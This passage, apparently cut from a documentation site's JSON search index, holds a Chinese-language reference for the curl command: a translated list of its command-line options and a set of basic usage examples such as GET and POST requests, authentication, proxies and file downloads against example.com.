\u4e00\u6837\uff0c\u4f46\u53d1\u9001\u8ba4\u8bc1\u5230\u5176\u4ed6\u4e3b\u673a (H) -M, --manual \u663e\u793a\u5b8c\u6574\u624b\u518c --mail-from FROM \u4ece\u8fd9\u4e2a\u5730\u5740\u53d1\u90ae\u4ef6 --mail-rcpt TO \u53d1\u90ae\u4ef6\u7ed9\u8fd9\u4e2a\u63a5\u6536\u8005/\u63a5\u6536\u8005\u4eec --mail-auth AUTH \u539f\u59cb\u7535\u5b50\u90ae\u4ef6\u7684\u53d1\u8d77\u4eba\u5730\u5740 --max-filesize BYTES \u8981\u4e0b\u8f7d\u7684\u6700\u5927\u6587\u4ef6\u5927\u5c0f (H/F) --max-redirs NUM \u5141\u8bb8\u7684\u6700\u5927\u91cd\u5b9a\u5411\u6b21\u6570 (H) -m, --max-time SECONDS \u4f20\u8f93\u6240\u5141\u8bb8\u7684\u6700\u5927\u65f6\u95f4 --metalink \u5c06\u7ed9\u5b9a\u7684 URL \u5f53\u4f5c metalink XML \u6587\u4ef6\u5904\u7406 --negotiate \u4f7f\u7528 HTTP Negot -o, --output FILE \u5c06\u8f93\u51fa\u5199\u5165<file>\uff0c\u800c\u4e0d\u662f\u6807\u51c6\u8f93\u51fa --pass PASS \u79c1\u94a5\u7684\u901a\u884c\u77ed\u8bed\uff08SSL/SSH\uff09 --post301 \u5728\u8ddf\u968f301\u91cd\u5b9a\u5411\u540e\u4e0d\u5207\u6362\u5230GET\uff08H\uff09 --post302 \u5728\u8ddf\u968f302\u91cd\u5b9a\u5411\u540e\u4e0d\u5207\u6362\u5230GET\uff08H\uff09 --post303 \u5728\u8ddf\u968f303\u91cd\u5b9a\u5411\u540e\u4e0d\u5207\u6362\u5230GET\uff08H\uff09 -#, --progress-bar \u4ee5\u8fdb\u5ea6\u6761\u5f62\u5f0f\u663e\u793a\u4f20\u8f93\u8fdb\u5ea6 --proto PROTOCOLS \u542f\u7528/\u7981\u7528\u6307\u5b9a\u534f\u8bae --proto-redir PROTOCOLS \u5728\u91cd\u5b9a\u5411\u65f6\u542f\u7528/\u7981\u7528\u6307\u5b9a\u534f\u8bae -x, --proxy [PROTOCOL://]HOST[:PORT] \u4f7f\u7528\u7ed9\u5b9a\u7aef\u53e3\u4e0a\u7684\u4ee3\u7406 --proxy-anyauth \u9009\u62e9\u201c\u4efb\u610f\u201d\u4ee3\u7406\u8ba4\u8bc1\u65b9\u5f0f\uff08H\uff09 --proxy-basic \u5728\u4ee3\u7406\u4e0a\u4f7f\u7528\u57fa\u672c\u8ba4\u8bc1\uff08H\uff09 --proxy-digest \u5728\u4ee3\u7406\u4e0a\u4f7f\u7528\u6458\u8981\u8ba4\u8bc1\uff08H\uff09 --proxy-negotiate \u5728\u4ee3\u7406\u4e0a\u4f7f\u7528\u534f\u5546\u8ba4\u8bc1\uff08H\uff09 --proxy-ntlm \u5728\u4ee3\u7406\u4e0a\u4f7f\u7528NTLM\u8ba4\u8bc1\uff08H\uff09 -U, --proxy-user USER[:PASSWORD] \u4ee3\u7406\u7528\u6237\u548c\u5bc6\u7801 --proxy1.0 HOST[:PORT] \u4f7f\u7528\u7ed9\u5b9a\u7aef\u53e3\u4e0a\u7684HTTP/1.0\u4ee3\u7406 -p, --proxytunnel \u901a\u8fc7HTTP\u4ee3\u7406\u96a7\u9053\u64cd\u4f5c\uff08\u4f7f\u7528CONNECT\uff09 --pubkey KEY \u516c\u94a5\u6587\u4ef6\u540d\uff08SSH\uff09 -Q, --quote CMD \u5728\u4f20\u8f93\u524d\u5411\u670d\u52a1\u5668\u53d1\u9001\u547d\u4ee4\uff08F/SFTP\uff09 --random-file FILE \u4ece\u4e2d\u8bfb\u53d6\u968f\u673a\u6570\u636e\u7684\u6587\u4ef6\uff08SSL\uff09 -r, --range RANGE \u53ea\u68c0\u7d22\u8303\u56f4\u5185\u7684\u5b57\u8282 --raw \u4ee5HTTP\u201c\u539f\u59cb\u201d\u65b9\u5f0f\u8fdb\u884c\uff0c\u4e0d\u8fdb\u884c\u4efb\u4f55\u4f20\u8f93\u89e3\u7801\uff08H\uff09 -e, --referer \u5f15\u7528URL\uff08H\uff09 -J, --remote-header-name \u4f7f\u7528\u5934\u6587\u4ef6\u63d0\u4f9b\u7684\u6587\u4ef6\u540d\uff08H\uff09 -O, --remote-name \u5c06\u8f93\u51fa\u5199\u5165\u4e00\u4e2a\u547d\u540d\u4e3a\u8fdc\u7a0b\u6587\u4ef6\u7684\u6587\u4ef6 --remote-name-all \u5bf9\u6240\u6709URL\u4f7f\u7528\u8fdc\u7a0b\u6587\u4ef6\u540d -R, --remote-time \u5728\u672c\u5730\u8f93\u51fa\u4e0a\u8bbe\u7f6e\u8fdc\u7a0b\u6587\u4ef6\u7684\u65f6\u95f4 -X, --request COMMAND \u6307\u5b9a\u8981\u4f7f\u7528\u7684\u8bf7\u6c42\u547d\u4ee4 --resolve HOST:PORT:ADDRESS \u5f3a\u5236\u89e3\u6790HOST:PORT\u4e3aADDRESS --retry NUM \u5982\u9047\u5230\u6682\u65f6\u6027\u95ee\u9898\uff0c\u91cd\u8bd5\u8bf7\u6c42NUM\u6b21 --retry-delay SECONDS \u91cd\u8bd5\u65f6\uff0c\u6bcf\u6b21\u4e4b\u95f4\u7b49\u5f85\u8fd9\u4e48\u591a\u79d2 --retry-max-time SECONDS \u53ea\u5728\u6b64\u671f\u95f4\u5185\u91cd\u8bd5 -S, --show-error \u663e\u793a\u9519\u8bef\u3002\u4e0e-s\u4e00\u8d77\u4f7f\u7528\u65f6\uff0c\u4f7fcurl\u5728\u51fa\u73b0\u9519\u8bef\u65f6\u663e\u793a\u9519\u8bef -s, --silent \u9759\u9ed8\u6a21\u5f0f\u3002\u4e0d\u8f93\u51fa\u4efb\u4f55\u4e1c\u897f --socks4 HOST[:PORT] \u5728\u7ed9\u5b9a\u7684\u4e3b\u673a+\u7aef\u53e3\u4e0a\u4f7f\u7528SOCKS4\u4ee3\u7406 --socks4a HOST[:PORT] \u5728\u7ed9\u5b9a\u7684\u4e3b\u673a+\u7aef\u53e3\u4e0a\u4f7f\u7528SOCKS4a\u4ee3\u7406 --socks5 HOST[:PORT] \u5728\u7ed9\u5b9a\u7684\u4e3b\u673a+\u7aef\u53e3\u4e0a\u4f7f\u7528SOCKS5\u4ee3\u7406 --socks5-basic \u542f\u7528SOCKS5\u4ee3\u7406\u7684\u7528\u6237\u540d/\u5bc6\u7801\u8ba4\u8bc1 --socks5-gssapi \u542f\u7528SOCKS5\u4ee3\u7406\u7684GSS-API\u8ba4\u8bc1 --socks5-hostname HOST[:PORT] SOCKS5\u4ee3\u7406\uff0c\u5c06\u4e3b\u673a\u540d\u4f20\u9012\u7ed9\u4ee3\u7406 --socks5-gssapi-service NAME SOCKS5\u4ee3\u7406\u7684gssapi\u670d\u52a1\u540d --socks5-gssapi-nec \u4e0eNEC SOCKS5\u670d\u52a1\u5668\u7684\u517c\u5bb9\u6027 -Y, --speed-limit RATE \u5728'speed-time'\u79d2\u5185\u505c\u6b62\u4f4e\u4e8e\u901f\u5ea6\u9650\u5236\u7684\u4f20\u8f93 -y, --speed-time SECONDS \u89e6\u53d1\u901f\u5ea6\u9650\u5236\u4e2d\u6b62\u7684\u65f6\u95f4\u3002\u9ed8\u8ba4\u4e3a30\u79d2 --ssl \u5c1d\u8bd5SSL/TLS\uff08FTP, IMAP, POP3, SMTP\uff09 --ssl-reqd \u8981\u6c42SSL/TLS\uff08FTP, IMAP, POP3, SMTP\uff09 -2, --sslv2 \u4f7f\u7528SSLv2\uff08SSL\uff09 -3, --sslv3 \u4f7f\u7528SSLv3\uff08SSL\uff09 --ssl-allow-beast \u5141\u8bb8\u5b89\u5168\u6f0f\u6d1e\u4ee5\u63d0\u9ad8\u4e92\u64cd\u4f5c\u6027\uff08SSL\uff09 --stderr FILE \u5c06stderr\u91cd\u5b9a\u5411\u5230\u54ea\u91cc\u3002- \u8868\u793a\u6807\u51c6\u8f93\u51fa --tcp-nodelay \u4f7f\u7528TCP_NODELAY\u9009\u9879 -t, --telnet-option OPT=VAL \u8bbe\u7f6etelnet\u9009\u9879 --tftp-blksize VALUE \u8bbe\u7f6eTFTP BLKSIZE\u9009\u9879\uff08\u5fc5\u987b>512\uff09 -z, --time-cond TIME \u57fa\u4e8e\u65f6\u95f4\u6761\u4ef6\u8fdb\u884c\u4f20\u8f93 -1, --tlsv1 \u4f7f\u7528 => TLSv1\uff08SSL\uff09 --tlsv1.0 \u4f7f\u7528TLSv1.0\uff08SSL\uff09 --tlsv1.1 \u4f7f\u7528TLSv1.1\uff08SSL\uff09 --tlsv1.2 \u4f7f\u7528TLSv1.2\uff08SSL\uff09 --tlsv1.3 \u4f7f\u7528TLSv1.3\uff08SSL\uff09 --tls-max VERSION \u4f7f\u7528TLS\u6700\u591a\u5230VERSION\uff08SSL\uff09 --trace FILE \u5c06\u8c03\u8bd5\u8ddf\u8e2a\u5199\u5165\u7ed9\u5b9a\u6587\u4ef6 --trace-ascii FILE \u50cf--trace\u4e00\u6837\uff0c\u4f46\u6ca1\u6709\u5341\u516d\u8fdb\u5236\u8f93\u51fa --trace-time \u5728\u8ddf\u8e2a/\u8be6\u7ec6\u8f93\u51fa\u4e2d\u6dfb\u52a0\u65f6\u95f4\u6233 --tr-encoding \u8bf7\u6c42\u538b\u7f29\u7684\u4f20\u8f93\u7f16\u7801\uff08H\uff09 -T, --upload-file FILE \u5c06FILE\u4f20\u8f93\u5230\u76ee\u7684\u5730 --url URL \u8981\u5904\u7406\u7684URL -B, --use-ascii \u4f7f\u7528ASCII/\u6587\u672c\u4f20\u8f93 -u, --user USER[:PASSWORD] \u670d\u52a1\u5668\u7528\u6237\u548c\u5bc6\u7801 --tlsuser USER TLS\u7528\u6237\u540d --tlspassword STRING TLS\u5bc6\u7801 --tlsauthtype STRING TLS\u8ba4\u8bc1\u7c7b\u578b\uff08\u9ed8\u8ba4SRP\uff09 --unix-socket FILE \u901a\u8fc7\u8fd9\u4e2aUNIX\u57df\u5957\u63a5\u5b57\u8fde\u63a5 -A, --user-agent STRING \u53d1\u9001\u5230\u670d\u52a1\u5668\u7684User-Agent\uff08H\uff09 -v, --verbose \u4f7f\u64cd\u4f5c\u66f4\u52a0\u8be6\u7ec6 -V, --version \u663e\u793a\u7248\u672c\u53f7\u5e76\u9000\u51fa -w, --write-out FORMAT \u5b8c\u6210\u540e\u8f93\u51fa\u4ec0\u4e48 --xattr \u5728\u6269\u5c55\u6587\u4ef6\u5c5e\u6027\u4e2d\u5b58\u50a8\u5143\u6570\u636e -q \u5982\u679c\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f7f\u7528\uff0c\u5219\u7981\u7528.curlrc curl \u662f\u4e00\u4e2a\u975e\u5e38\u5f3a\u5927\u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5b83\u7528\u4e8e\u4f20\u8f93\u6570\u636e\uff0c\u901a\u5e38\u7528\u4e8eHTTP\u8bf7\u6c42\u3002\u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u7528\u7684 curl \u7528\u6cd5\uff1a \u7b80\u5355\u7684GET\u8bf7\u6c42 \uff1a curl http://example.com \u5e26\u6709\u5934\u4fe1\u606f\u7684GET\u8bf7\u6c42 \uff1a curl -H \"Content-Type: application/json\" http://example.com \u53d1\u9001POST\u8bf7\u6c42 \uff1a curl -X POST http://example.com \u53d1\u9001POST\u8bf7\u6c42\u643a\u5e26\u6570\u636e \uff1a curl -X POST -d \"param1=value1&param2=value2\" http://example.com \u4ee5JSON\u683c\u5f0f\u53d1\u9001POST\u6570\u636e \uff1a curl -X POST -H \"Content-Type: application/json\" -d '{\"param1\":\"value1\", \"param2\":\"value2\"}' http://example.com \u4f7f\u7528\u57fa\u672c\u7684HTTP\u8ba4\u8bc1 \uff1a curl -u username:password http://example.com \u4fdd\u5b58\u8f93\u51fa\u5230\u6587\u4ef6 \uff1a curl -o filename.html http://example.com \u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6POST\u6570\u636e \uff1a curl -X POST -d @data.txt http://example.com \u53d1\u9001PUT\u8bf7\u6c42 \uff1a curl -X PUT -d \"param=value\" http://example.com \u5220\u9664\u8bf7\u6c42 \uff1a curl -X DELETE http://example.com/resource \u8bbe\u7f6e\u8d85\u65f6\u65f6\u95f4 \uff1a curl -m 10 http://example.com \u901a\u8fc7\u4ee3\u7406\u53d1\u9001\u8bf7\u6c42 \uff1a curl -x http://proxyserver:port http://example.com \u663e\u793a\u8bf7\u6c42\u5934\u4fe1\u606f \uff1a curl -I http://example.com \u4e0b\u8f7d\u6587\u4ef6\u5e76\u91cd\u547d\u540d \uff1a curl -o newfilename.html http://example.com/oldfilename.html \u65ad\u70b9\u7eed\u4f20\u4e0b\u8f7d\u6587\u4ef6 \uff1a curl -C - -O http://example.com/bigfile.zip \u4f7f\u7528HTTPS\u534f\u8bae\uff0c\u5e76\u5ffd\u7565SSL\u8bc1\u4e66\u68c0\u67e5 \uff1a curl -k https://example.com \u663e\u793a\u8be6\u7ec6\u7684\u8fde\u63a5\u4fe1\u606f \uff1a curl -v http://example.com curl \u7684\u7528\u6cd5\u975e\u5e38\u5e7f\u6cdb\uff0c\u4e0a\u9762\u8fd9\u4e9b\u662f\u4e00\u4e9b\u5e38\u89c1\u548c\u57fa\u672c\u7684\u7528\u6cd5\u3002\u4f60\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u9700\u6c42\u8fdb\u884c\u9009\u62e9\u548c\u7ec4\u5408\u3002 curl \u547d\u4ee4\uff0cLinux curl \u547d\u4ee4\u8be6\u89e3\uff1a\u5229\u7528URL\u89c4\u5219\u5728\u547d\u4ee4\u884c\u4e0b\u5de5\u4f5c\u7684\u6587\u4ef6\u4f20\u8f93\u5de5\u5177 - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com)","title":"curl\u547d\u4ee4"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/curl%E5%91%BD%E4%BB%A4/#curl","text":"\u4f7f\u7528\u65b9\u5f0f\uff1acurl [\u9009\u9879...] <url> \u9009\u9879\uff1a(H) \u4ee3\u8868\u4ec5\u9002\u7528\u4e8e HTTP/HTTPS\uff0c(F) \u4ee3\u8868\u4ec5\u9002\u7528\u4e8e FTP --anyauth \u9009\u62e9\u201c\u4efb\u4f55\u201d\u8ba4\u8bc1\u65b9\u5f0f (H) -a, --append \u4e0a\u4f20\u65f6\u8ffd\u52a0\u5230\u76ee\u6807\u6587\u4ef6 (F/SFTP) --basic \u4f7f\u7528 HTTP \u57fa\u672c\u8ba4\u8bc1 (H) --cacert FILE \u7528\u4e8e\u5bf9\u7b49\u65b9\u9a8c\u8bc1\u7684 CA \u8bc1\u4e66 (SSL) --capath DIR \u7528\u4e8e\u5bf9\u7b49\u65b9\u9a8c\u8bc1\u7684 CA \u76ee\u5f55 (SSL) -E, --cert CERT[:PASSWD] \u5ba2\u6237\u7aef\u8bc1\u4e66\u6587\u4ef6\u548c\u5bc6\u7801 (SSL) --cert-type TYPE \u8bc1\u4e66\u6587\u4ef6\u7c7b\u578b (DER/PEM/ENG) (SSL) --ciphers LIST \u8981\u4f7f\u7528\u7684 SSL \u5bc6\u7801 (SSL) --compressed \u8bf7\u6c42\u538b\u7f29\u54cd\u5e94 (\u4f7f\u7528 deflate \u6216 gzip) -K, --config FILE \u6307\u5b9a\u8981\u8bfb\u53d6\u7684\u914d\u7f6e\u6587\u4ef6 --connect-timeout SECONDS \u8fde\u63a5\u7684\u6700\u957f\u5141\u8bb8\u65f6\u95f4 -C, --continue-at OFFSET \u6062\u590d\u4f20\u8f93\u7684\u504f\u79fb\u91cf -b, --cookie STRING/FILE \u4ece\u5b57\u7b26\u4e32\u6216\u6587\u4ef6\u8bfb\u53d6 cookie (H) -c, --cookie-jar FILE \u64cd\u4f5c\u540e\u5c06 cookie \u5199\u5165\u6b64\u6587\u4ef6 (H) --create-dirs \u521b\u5efa\u5fc5\u8981\u7684\u672c\u5730\u76ee\u5f55\u7ed3\u6784 --crlf \u4e0a\u4f20\u65f6\u5c06 LF \u8f6c\u6362\u4e3a CRLF --crlfile FILE \u4ece\u7ed9\u5b9a\u6587\u4ef6\u83b7\u53d6 PEM \u683c\u5f0f\u7684 CRL \u5217\u8868 -d, --data DATA HTTP POST \u6570\u636e (H) --data-ascii DATA HTTP POST ASCII \u6570\u636e (H) --data-binary DATA HTTP POST \u4e8c\u8fdb\u5236\u6570\u636e (H) --data-urlencode DATA HTTP POST \u6570\u636e URL \u7f16\u7801 (H) --delegation STRING GSS-API \u59d4\u6d3e\u6743\u9650 --digest \u4f7f\u7528 HTTP \u6458\u8981\u8ba4\u8bc1 (H) --disable-eprt \u7981\u6b62\u4f7f\u7528 EPRT \u6216 LPRT (F) --disable-epsv \u7981\u6b62\u4f7f\u7528 EPSV (F) -D, --dump-header FILE \u5c06\u5934\u4fe1\u606f\u5199\u5165\u6b64\u6587\u4ef6 --egd-file FILE EGD \u5957\u63a5\u5b57\u8def\u5f84\uff0c\u7528\u4e8e\u968f\u673a\u6570\u636e (SSL) --engine ENGINGE \u52a0\u5bc6\u5f15\u64ce (SSL)\u3002\u201c--engine list\u201d \u663e\u793a\u5217\u8868 -f, --fail \u5728 HTTP \u9519\u8bef\u65f6\u9759\u9ed8\u5931\u8d25\uff08\u5b8c\u5168\u6ca1\u6709\u8f93\u51fa\uff09(H) -F, --form CONTENT \u6307\u5b9a HTTP \u591a\u90e8\u5206 POST \u6570\u636e (H) --form-string STRING \u6307\u5b9a HTTP \u591a\u90e8\u5206 POST \u6570\u636e (H) --ftp-account DATA \u8d26\u6237\u6570\u636e\u5b57\u7b26\u4e32 (F) --ftp-alternative-to-user COMMAND \u7528\u4e8e\u66ff\u6362 \u201cUSER [name]\u201d \u7684\u5b57\u7b26\u4e32 (F) --ftp-create-dirs \u5982\u679c\u8fdc\u7a0b\u76ee\u5f55\u4e0d\u5b58\u5728\uff0c\u5219\u521b\u5efa (F) --ftp-method [MULTICWD/NOCWD/SINGLECWD] \u63a7\u5236 CWD \u4f7f\u7528 (F) --ftp-pasv \u4f7f\u7528 PASV/EPSV \u800c\u4e0d\u662f PORT (F) -P, --ftp-port ADR \u4f7f\u7528 PORT \u4ee5\u53ca\u7ed9\u5b9a\u5730\u5740\u800c\u975e PASV (F) --ftp-skip-pasv-ip \u8df3\u8fc7 PASV \u7684 IP \u5730\u5740 (F) --ftp-pret \u5728 PASV \u4e4b\u524d\u53d1\u9001 PRET\uff08\u7528\u4e8e drftpd\uff09(F) --ftp-ssl-ccc \u5728\u8ba4\u8bc1\u540e\u53d1\u9001 CCC (F) --ftp-ssl-ccc-mode ACTIVE/PASSIVE \u8bbe\u7f6e CCC \u6a21\u5f0f (F) --ftp-ssl-control \u5bf9\u4e8e ftp \u767b\u5f55\u8981\u6c42 SSL/TLS\uff0c\u4f20\u8f93\u65f6\u6e05\u9664 (F) -G, --get \u4f7f\u7528 HTTP GET \u53d1\u9001 -d \u6570\u636e (H) -g, --globoff \u7981\u7528\u4f7f\u7528 {} \u548c [] \u7684 URL \u5e8f\u5217\u548c\u8303\u56f4 -H, --header LINE \u53d1\u9001\u7ed9\u670d\u52a1\u5668\u7684\u81ea\u5b9a\u4e49\u5934\u4fe1\u606f (H) -I, --head \u4ec5\u663e\u793a\u6587\u6863\u4fe1\u606f -h, --help \u6b64\u5e2e\u52a9\u6587\u672c --hostpubmd5 MD5 \u5bbf\u4e3b\u516c\u94a5\u7684\u5341\u516d\u8fdb\u5236\u7f16\u7801 MD5 \u5b57\u7b26\u4e32 (SSH) -0, --http1.0 \u4f7f\u7528 HTTP 1.0 (H) --ignore-content-length \u5ffd\u7565 HTTP Content-Length \u5934 -i, --include \u5728\u8f93\u51fa\u4e2d\u5305\u542b\u534f\u8bae\u5934 (H/F) -k, --insecure \u5141\u8bb8\u8fde\u63a5\u5230\u6ca1\u6709\u8bc1\u4e66\u7684 SSL \u7ad9\u70b9 (H) --interface INTERFACE \u6307\u5b9a\u8981\u4f7f\u7528\u7684\u7f51\u7edc\u63a5\u53e3/\u5730\u5740 -4, --ipv4 \u5c06\u540d\u79f0\u89e3\u6790\u4e3a IPv4 \u5730\u5740 -6, --ipv6 \u5c06\u540d\u79f0\u89e3\u6790\u4e3a IPv6 \u5730\u5740 -j, --junk-session-cookies \u5ffd\u7565\u4ece\u6587\u4ef6\u8bfb\u53d6\u7684\u4f1a\u8bdd cookie (H) --keepalive-time SECONDS \u4fdd\u6301\u6d3b\u52a8\u63a2\u6d4b\u4e4b\u95f4\u7684\u95f4\u9694 --key KEY \u79c1\u94a5\u6587\u4ef6\u540d (SSL/SSH) --key-type TYPE \u79c1\u94a5\u6587\u4ef6\u7c7b\u578b (DER/PEM/ENG) (SSL) --krb LEVEL \u542f\u7528 Kerberos\uff0c\u5e76\u6307\u5b9a\u5b89\u5168\u7ea7\u522b (F) --libcurl FILE \u5c06\u6b64\u547d\u4ee4\u884c\u7684 libcurl \u7b49\u6548\u4ee3\u7801\u8f6c\u50a8 --limit-rate RATE \u5c06\u4f20\u8f93\u901f\u5ea6\u9650\u5236\u4e3a\u6b64\u901f\u7387 -l, --list-only \u4ec5\u5217\u51fa FTP \u76ee\u5f55\u7684\u540d\u79f0 (F) --local-port RANGE \u5f3a\u5236\u4f7f\u7528\u8fd9\u4e9b\u672c\u5730\u7aef\u53e3\u53f7 -L, --location \u8ddf\u968f\u91cd\u5b9a\u5411 (H) --location-trusted \u50cf --location \u4e00\u6837\uff0c\u4f46\u53d1\u9001\u8ba4\u8bc1\u5230\u5176\u4ed6\u4e3b\u673a (H) -M, --manual \u663e\u793a\u5b8c\u6574\u624b\u518c --mail-from FROM \u4ece\u8fd9\u4e2a\u5730\u5740\u53d1\u90ae\u4ef6 --mail-rcpt TO \u53d1\u90ae\u4ef6\u7ed9\u8fd9\u4e2a\u63a5\u6536\u8005/\u63a5\u6536\u8005\u4eec --mail-auth AUTH \u539f\u59cb\u7535\u5b50\u90ae\u4ef6\u7684\u53d1\u8d77\u4eba\u5730\u5740 --max-filesize BYTES \u8981\u4e0b\u8f7d\u7684\u6700\u5927\u6587\u4ef6\u5927\u5c0f (H/F) --max-redirs NUM \u5141\u8bb8\u7684\u6700\u5927\u91cd\u5b9a\u5411\u6b21\u6570 (H) -m, --max-time SECONDS \u4f20\u8f93\u6240\u5141\u8bb8\u7684\u6700\u5927\u65f6\u95f4 --metalink \u5c06\u7ed9\u5b9a\u7684 URL \u5f53\u4f5c metalink XML \u6587\u4ef6\u5904\u7406 --negotiate \u4f7f\u7528 HTTP Negot -o, --output FILE \u5c06\u8f93\u51fa\u5199\u5165<file>\uff0c\u800c\u4e0d\u662f\u6807\u51c6\u8f93\u51fa --pass PASS \u79c1\u94a5\u7684\u901a\u884c\u77ed\u8bed\uff08SSL/SSH\uff09 --post301 \u5728\u8ddf\u968f301\u91cd\u5b9a\u5411\u540e\u4e0d\u5207\u6362\u5230GET\uff08H\uff09 --post302 \u5728\u8ddf\u968f302\u91cd\u5b9a\u5411\u540e\u4e0d\u5207\u6362\u5230GET\uff08H\uff09 --post303 \u5728\u8ddf\u968f303\u91cd\u5b9a\u5411\u540e\u4e0d\u5207\u6362\u5230GET\uff08H\uff09 -#, --progress-bar \u4ee5\u8fdb\u5ea6\u6761\u5f62\u5f0f\u663e\u793a\u4f20\u8f93\u8fdb\u5ea6 --proto PROTOCOLS \u542f\u7528/\u7981\u7528\u6307\u5b9a\u534f\u8bae --proto-redir PROTOCOLS \u5728\u91cd\u5b9a\u5411\u65f6\u542f\u7528/\u7981\u7528\u6307\u5b9a\u534f\u8bae -x, --proxy [PROTOCOL://]HOST[:PORT] \u4f7f\u7528\u7ed9\u5b9a\u7aef\u53e3\u4e0a\u7684\u4ee3\u7406 --proxy-anyauth \u9009\u62e9\u201c\u4efb\u610f\u201d\u4ee3\u7406\u8ba4\u8bc1\u65b9\u5f0f\uff08H\uff09 --proxy-basic \u5728\u4ee3\u7406\u4e0a\u4f7f\u7528\u57fa\u672c\u8ba4\u8bc1\uff08H\uff09 --proxy-digest \u5728\u4ee3\u7406\u4e0a\u4f7f\u7528\u6458\u8981\u8ba4\u8bc1\uff08H\uff09 --proxy-negotiate \u5728\u4ee3\u7406\u4e0a\u4f7f\u7528\u534f\u5546\u8ba4\u8bc1\uff08H\uff09 --proxy-ntlm \u5728\u4ee3\u7406\u4e0a\u4f7f\u7528NTLM\u8ba4\u8bc1\uff08H\uff09 -U, --proxy-user USER[:PASSWORD] \u4ee3\u7406\u7528\u6237\u548c\u5bc6\u7801 --proxy1.0 HOST[:PORT] \u4f7f\u7528\u7ed9\u5b9a\u7aef\u53e3\u4e0a\u7684HTTP/1.0\u4ee3\u7406 -p, --proxytunnel \u901a\u8fc7HTTP\u4ee3\u7406\u96a7\u9053\u64cd\u4f5c\uff08\u4f7f\u7528CONNECT\uff09 --pubkey KEY \u516c\u94a5\u6587\u4ef6\u540d\uff08SSH\uff09 -Q, --quote CMD \u5728\u4f20\u8f93\u524d\u5411\u670d\u52a1\u5668\u53d1\u9001\u547d\u4ee4\uff08F/SFTP\uff09 --random-file FILE \u4ece\u4e2d\u8bfb\u53d6\u968f\u673a\u6570\u636e\u7684\u6587\u4ef6\uff08SSL\uff09 -r, --range RANGE \u53ea\u68c0\u7d22\u8303\u56f4\u5185\u7684\u5b57\u8282 --raw \u4ee5HTTP\u201c\u539f\u59cb\u201d\u65b9\u5f0f\u8fdb\u884c\uff0c\u4e0d\u8fdb\u884c\u4efb\u4f55\u4f20\u8f93\u89e3\u7801\uff08H\uff09 -e, --referer \u5f15\u7528URL\uff08H\uff09 -J, --remote-header-name \u4f7f\u7528\u5934\u6587\u4ef6\u63d0\u4f9b\u7684\u6587\u4ef6\u540d\uff08H\uff09 -O, --remote-name \u5c06\u8f93\u51fa\u5199\u5165\u4e00\u4e2a\u547d\u540d\u4e3a\u8fdc\u7a0b\u6587\u4ef6\u7684\u6587\u4ef6 --remote-name-all \u5bf9\u6240\u6709URL\u4f7f\u7528\u8fdc\u7a0b\u6587\u4ef6\u540d -R, --remote-time \u5728\u672c\u5730\u8f93\u51fa\u4e0a\u8bbe\u7f6e\u8fdc\u7a0b\u6587\u4ef6\u7684\u65f6\u95f4 -X, --request COMMAND \u6307\u5b9a\u8981\u4f7f\u7528\u7684\u8bf7\u6c42\u547d\u4ee4 --resolve HOST:PORT:ADDRESS \u5f3a\u5236\u89e3\u6790HOST:PORT\u4e3aADDRESS --retry NUM \u5982\u9047\u5230\u6682\u65f6\u6027\u95ee\u9898\uff0c\u91cd\u8bd5\u8bf7\u6c42NUM\u6b21 --retry-delay SECONDS \u91cd\u8bd5\u65f6\uff0c\u6bcf\u6b21\u4e4b\u95f4\u7b49\u5f85\u8fd9\u4e48\u591a\u79d2 --retry-max-time SECONDS \u53ea\u5728\u6b64\u671f\u95f4\u5185\u91cd\u8bd5 -S, --show-error \u663e\u793a\u9519\u8bef\u3002\u4e0e-s\u4e00\u8d77\u4f7f\u7528\u65f6\uff0c\u4f7fcurl\u5728\u51fa\u73b0\u9519\u8bef\u65f6\u663e\u793a\u9519\u8bef -s, --silent \u9759\u9ed8\u6a21\u5f0f\u3002\u4e0d\u8f93\u51fa\u4efb\u4f55\u4e1c\u897f --socks4 HOST[:PORT] \u5728\u7ed9\u5b9a\u7684\u4e3b\u673a+\u7aef\u53e3\u4e0a\u4f7f\u7528SOCKS4\u4ee3\u7406 --socks4a HOST[:PORT] \u5728\u7ed9\u5b9a\u7684\u4e3b\u673a+\u7aef\u53e3\u4e0a\u4f7f\u7528SOCKS4a\u4ee3\u7406 --socks5 HOST[:PORT] \u5728\u7ed9\u5b9a\u7684\u4e3b\u673a+\u7aef\u53e3\u4e0a\u4f7f\u7528SOCKS5\u4ee3\u7406 --socks5-basic \u542f\u7528SOCKS5\u4ee3\u7406\u7684\u7528\u6237\u540d/\u5bc6\u7801\u8ba4\u8bc1 --socks5-gssapi \u542f\u7528SOCKS5\u4ee3\u7406\u7684GSS-API\u8ba4\u8bc1 --socks5-hostname HOST[:PORT] SOCKS5\u4ee3\u7406\uff0c\u5c06\u4e3b\u673a\u540d\u4f20\u9012\u7ed9\u4ee3\u7406 --socks5-gssapi-service NAME SOCKS5\u4ee3\u7406\u7684gssapi\u670d\u52a1\u540d --socks5-gssapi-nec \u4e0eNEC SOCKS5\u670d\u52a1\u5668\u7684\u517c\u5bb9\u6027 -Y, --speed-limit RATE \u5728'speed-time'\u79d2\u5185\u505c\u6b62\u4f4e\u4e8e\u901f\u5ea6\u9650\u5236\u7684\u4f20\u8f93 -y, --speed-time SECONDS \u89e6\u53d1\u901f\u5ea6\u9650\u5236\u4e2d\u6b62\u7684\u65f6\u95f4\u3002\u9ed8\u8ba4\u4e3a30\u79d2 --ssl \u5c1d\u8bd5SSL/TLS\uff08FTP, IMAP, POP3, SMTP\uff09 --ssl-reqd \u8981\u6c42SSL/TLS\uff08FTP, IMAP, POP3, SMTP\uff09 -2, --sslv2 \u4f7f\u7528SSLv2\uff08SSL\uff09 -3, --sslv3 \u4f7f\u7528SSLv3\uff08SSL\uff09 --ssl-allow-beast \u5141\u8bb8\u5b89\u5168\u6f0f\u6d1e\u4ee5\u63d0\u9ad8\u4e92\u64cd\u4f5c\u6027\uff08SSL\uff09 --stderr FILE \u5c06stderr\u91cd\u5b9a\u5411\u5230\u54ea\u91cc\u3002- \u8868\u793a\u6807\u51c6\u8f93\u51fa --tcp-nodelay \u4f7f\u7528TCP_NODELAY\u9009\u9879 -t, --telnet-option OPT=VAL \u8bbe\u7f6etelnet\u9009\u9879 --tftp-blksize VALUE \u8bbe\u7f6eTFTP 